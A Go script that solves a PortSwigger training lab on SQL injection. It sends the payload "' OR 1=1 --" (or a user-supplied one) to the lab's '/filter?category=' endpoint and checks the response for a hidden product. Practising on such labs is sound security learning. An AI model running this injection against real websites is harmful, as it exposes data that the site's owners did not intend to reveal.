package main

// lab url: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"flag"
)

const uri = "/filter?category="

func main() {
	labURL, payload, proxyURL := parseArgs()

	if exploitSQLi(labURL, payload, proxyURL) {
		fmt.Println("[+] SQL injection successful!")
	} else {
		fmt.Println("[-] SQL injection unsuccessful!")
	}
}

func parseArgs() (string, string, string) {
	labURL := flag.String("u", "", "Root URL of the PortSwigger Lab")
	payload := flag.String("p", "", "SQL injection payload (Optional)")
	proxyURL := flag.String("proxy", "", "Proxy URL if wanted")

	flag.Parse()

	if *labURL == "" {
		fmt.Println("The lab URL must be provided")
		fmt.Printf("[-] Usage: -u <uri> -p <payload> --proxy <porxyURL>\n")
		os.Exit(1)
	}

	return *labURL, *payload, *proxyURL
}

func prepareURL(labURL, payload string) string {
	// Ensure URL has proper protocol prefix
	if !strings.HasPrefix(labURL, "http://") && !strings.HasPrefix(labURL, "https://") {
		labURL = "http://" + labURL
	}

	if strings.HasSuffix(labURL, "/") {
		labURL = labURL[:len(labURL) - 1]
	}

	if payload == ""{
		payload = "' OR 1=1 --"
	}

	return labURL + uri + payload
}

func configureProxy(proxyURL string) *http.Transport{
	transport := &http.Transport{}
	if proxyURL != "" {
		urlWithProxy, err := url.Parse(proxyURL)
		if err != nil {
			fmt.Println("[-] Error parsing proxy URL:", err)
			os.Exit(2)
		}

		transport.Proxy = http.ProxyURL(urlWithProxy)
	}

	return transport
}

func exploitSQLi(labURL, payload, proxyURL string) bool {
	fullURL := prepareURL(labURL, payload)
	transport := configureProxy(proxyURL)

	fmt.Printf("[+] Sendding request to URL \"%s\"\n", fullURL)
	client := &http.Client{Transport: transport}
	resp, err := client.Get(fullURL)
	if err != nil {
		fmt.Println("[-] Error during HTTP request:", err)
		return false
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			fmt.Println("[-] Error while closing response body")
		}
	}(resp.Body)

	// Read the response body
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("[-] Error reading response body:", err)
		return false
	}

	body := string(bodyBytes)
	if strings.Contains(body, "Cat Grin") {
		return true
	}
	return false
}